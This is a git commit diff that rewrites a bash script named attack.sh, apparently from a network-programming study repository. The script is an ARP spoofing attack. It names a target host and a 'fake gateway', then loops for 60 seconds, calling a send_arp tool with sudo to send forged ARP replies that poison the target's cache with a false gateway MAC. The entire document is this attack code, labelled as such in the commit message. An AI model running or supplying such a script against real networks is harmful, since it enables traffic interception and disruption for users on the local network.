c1616349fe87593ad069c2185620edaaa4c7cc78
SeanXP <iseanxp+code@gmail.com>
2017-05-25 16:20:43 +0800

    arp attack scripts :-)

--- unp/arp/attack.sh
+++ unp/arp/attack.sh
@@ -1,24 +1,30 @@
 #!/bin/bash
 #################################################################
 #   Copyright (C) 2015 Sean Guo. All rights reserved.
-#														  
-#	> File Name:        < send_arp.sh >
-#	> Author:           < Sean Guo >		
-#	> Mail:             < iseanxp@gmail.com >		
-#	> Created Time:     < 2015/05/13 >
-#	> Last Changed: 
+#
+#	> File Name:        < attack.sh >
+#	> Author:           < Sean Guo >
+#	> Mail:             < iseanxp+code@gmail.com >
+#	> Last Changed:     < 2017/05/25 >
 #	> Description:
 #################################################################
 
-# 10.42.1.224 at 00-E0-66-BE-52-80 (yyy-PC)
+# target host
+target_ip="10.42.1.100"
+target_mac="00:01:02:03:04:05"
 
-COUNTER=0
-ip="10.42.1.224"
-gateway="10.42.0.1"
+# fake gateway host
+gateway="10.42.1.1"
+fake_mac="aa:bb:cc:dd:ee:ff"
 
-while [ $COUNTER -lt 5 ]
+declare -i seconds
+seconds=0
+COUNTER=60
+while [ $seconds -lt $COUNTER ]
 do
-	sudo ./send_arp $gateway aa:bb:cc:dd:ee:ff $ip 00:E0:66:BE:52:80 1
-	sleep 1
-	echo 'send arp to ', $ip
+  #usage: send_arp src_ip_addr src_hw_addr targ_ip_addr tar_hw_addr number
+  sudo ./send_arp $gateway $fake_mac $target_ip $target_mac 1
+  echo "send fake arp to $target_ip"
+  seconds=$seconds+1
+  sleep 1
 done
